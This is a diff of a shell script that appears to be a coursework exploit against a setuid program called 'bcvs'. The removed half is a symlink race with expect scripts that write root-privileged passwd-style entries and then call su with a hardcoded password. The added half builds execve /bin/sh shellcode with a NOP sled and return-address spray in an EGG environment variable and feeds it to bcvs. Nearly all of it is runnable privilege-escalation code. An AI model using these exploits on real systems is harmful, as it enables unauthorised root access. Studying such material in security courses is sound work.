@@ -1,80 +1,73 @@
-#!/bin/sh
-touch subprocess.py
-cat << EOF >> subprocess.py
-import os, errno
-src = 'bcvs/block.list'
-dst='stuff2.txt.comments'
-try:
-	os.symlink(src,dst)
-except OSError as e:
-	if e.errno == errno.EEXIST:
-		os.remove(dst)
-		os.symlink(src, dst)
-	else:
-		raise e
-EOF
+#!/bin/bash
 
-touch run.sh
-cat << EOF >> run.sh
-#!/bin/sh
-sleep 5
-python subprocess.py
-gcc edit.c -o edit
-./edit
-EOF
+cd /opt/bcvs
 
-touch firstexp.exp
-cat << EOF >> firstexp.exp
-#!/usr/bin/expect -f
-set timeout -1
-spawn ./bcvs ci ../stuff.txt
-expect "Please write a SHORT explanation:\r"
-sleep 6
-send -- "root:x:0:0::/root:/bin/bash\r"
-expect eof
-spawn ./bcvs ci ../stuff.txt
-send -- "student:x:0:0::/root:/bin/bash\r"
-expect eof
-EOF
-
-touch both.exp
-cat << EOF >> both.exp
-#!/bin/sh
-set timeout -1
-spawn ./firstexp.exp
-spawn ./run.sh
-EOF
-
-touch edit.c
-cat << EOF >> edit.c
+touch shellcode.c
+cat <<EOF>> shellcode.c
+#include <stdlib.h>
 #include <stdio.h>
-int main() {
-	char buffer[] = {'x', 'y', 'z'};
-	FILE * pFile;
-	pFile = fopen("stuff2.txt", "w+");
-	fwrite(buffer,sizeof(char), sizeof(buffer), pFile);
-	fclose(pFile);	
-	return 0;
+#include <string.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
 }
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+}
+
 EOF
 
-touch thirdexp.exp
-cat << EOF >> thirdexp.exp
+gcc -o shellcode shellcode.c
+./shellcode 172 432
+
+touch expfile.exp
+cat <<EOF>> expfile.exp
 #!/usr/bin/expect -f
 set timeout -1
-spawn su student
-expect "Password:"
-send -- "security\r"
-interact 
+spawn ./bcvs ci $EGG
+
+expect "Please write a SHORT explanation:\r"
+send -- "anything\r"
 expect eof
 EOF
-chmod +x firstexp.exp
-chmod +x run.sh
-chmod +x both.exp
-chmod +x thirdexp.exp
-#./both.exp
-./thirdexp.exp
-rm firstexp.exp
-rm run.sh
-rm both.exp
 
+chmod +x expfile.exp
+./expfile.exp
